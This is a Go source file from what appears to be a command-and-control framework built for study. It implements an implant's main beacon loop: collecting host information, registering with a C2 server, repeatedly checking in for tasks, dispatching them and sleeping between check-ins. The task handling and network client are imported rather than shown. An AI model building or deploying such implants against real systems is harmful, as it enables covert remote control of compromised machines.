package runtime

import (
	"context"
	"errors"
	"time"
	
	"xhc2_for_studying/implant/client"
	"xhc2_for_studying/implant/config"
	"xhc2_for_studying/implant/identity"
	implantTask "xhc2_for_studying/implant/task"
	"xhc2_for_studying/protocol"
)

type Runner struct {
	cfg    *config.BeaconConfig
	client *client.Client
}

func NewRunner(cfg *config.BeaconConfig, client *client.Client) (*Runner, error) {
	if cfg == nil {
		return nil, errors.New("beacon config is nil")
	}
	if client == nil {
		return nil, errors.New("client is nil")
	}
	if cfg.Interval <= 0 {
		return nil, errors.New("interval must be greater than zero")
	}
	
	return &Runner{
		cfg:    cfg,
		client: client,
	}, nil
}

func (r *Runner) Run(ctx context.Context) error {
	if r == nil {
		return errors.New("runner is nil")
	}
	
	hostInfo, err := identity.CollectHostInfo()
	if err != nil {
		return err
	}
	
	beaconID, err := r.client.Register(hostInfo, r.cfg)
	if err != nil {
		return err
	}
	
	var pendingResult *protocol.TaskResult
	for {
		checkinResp, err := r.client.CheckIn(beaconID, pendingResult)
		if err != nil {
			return err
		}
		pendingResult = nil
		
		if len(checkinResp.Tasks) > 0 {
			pendingResult = implantTask.Dispatch(checkinResp.Tasks[0], beaconID)
		}
		
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(time.Duration(r.cfg.Interval) * time.Second):
		}
	}
}
